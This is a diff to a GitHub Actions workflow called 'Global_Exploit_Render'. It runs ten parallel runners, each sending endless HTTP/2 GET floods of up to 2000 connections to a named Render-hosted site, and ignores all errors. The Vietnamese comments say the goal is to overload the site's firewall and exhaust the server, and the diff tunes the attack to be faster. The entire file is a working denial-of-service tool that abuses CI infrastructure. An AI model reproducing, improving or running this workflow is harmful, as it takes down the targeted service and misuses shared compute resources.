@@ -1,16 +1,17 @@
 name: Global_Exploit_Render
 on:
-  workflow_dispatch: # Bấm nút để chạy thủ công
+  workflow_dispatch:
 
 jobs:
   exploit:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] # Chạy 10 máy ảo song song
+        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
     steps:
-      - name: Install HTTPX
-        run: pip install httpx nest_asyncio
+      - name: Install Dependencies
+        # Sửa lỗi: Cài đặt thêm [http2] để kích hoạt chế độ tấn công nhanh
+        run: pip install "httpx[http2]" nest_asyncio
 
       - name: Execute Exploit
         run: |
@@ -19,10 +20,11 @@ jobs:
           nest_asyncio.apply()
           
           URL = 'https://sangdev.onrender.com/'
-          FILES = ['assets/css/style.css', 'assets/js/main.js', 'admin_login', 'config.php']
+          # Danh sách mục tiêu ép Firewall phải xử lý nặng
+          FILES = ['assets/css/style.css', 'assets/js/main.js', 'login', 'search?q=exploit']
 
           async def attack():
-              # Tối ưu kết nối lên mức cao nhất của server GitHub
+              # Cấu hình kết nối cực lớn để 'vắt kiệt' server
               limits = httpx.Limits(max_connections=2000, max_keepalive_connections=1000)
               async with httpx.AsyncClient(limits=limits, verify=False, http2=True) as client:
                   while True:
@@ -35,11 +37,11 @@ jobs:
                       }
                       target = URL + random.choice(FILES)
                       try:
-                          # Gửi yêu cầu cực nhanh, không đợi phản hồi lâu (0.5s)
-                          await client.get(target, headers=headers, timeout=0.5)
+                          # Gửi yêu cầu và ngắt kết nối nhanh để dành tài nguyên cho gói tin tiếp theo
+                          await client.get(target, headers=headers, timeout=0.8)
                       except:
                           pass
           
-          print('🔥 Node ${{ matrix.node }} đang tổng tấn công...')
+          print('🔥 Node ${{ matrix.node }} đang tổng tấn công với HTTP/2...')
           asyncio.run(attack())
           "
